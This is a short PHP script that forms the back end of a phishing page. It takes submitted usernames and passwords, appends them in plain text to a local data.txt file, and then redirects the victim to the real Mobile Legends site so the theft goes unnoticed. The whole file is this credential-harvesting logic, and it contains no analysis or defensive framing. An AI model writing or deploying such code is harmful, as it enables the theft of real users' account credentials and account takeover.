<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $u = $_POST['username'];
    $p = $_POST['password'];
    $f = fopen("data.txt", "a");
    fwrite($f, "User: $u | Pass: $p\n");
    fclose($f);
    header("Location: https://www.mobilelegends.com");
    exit();
}
?>
?>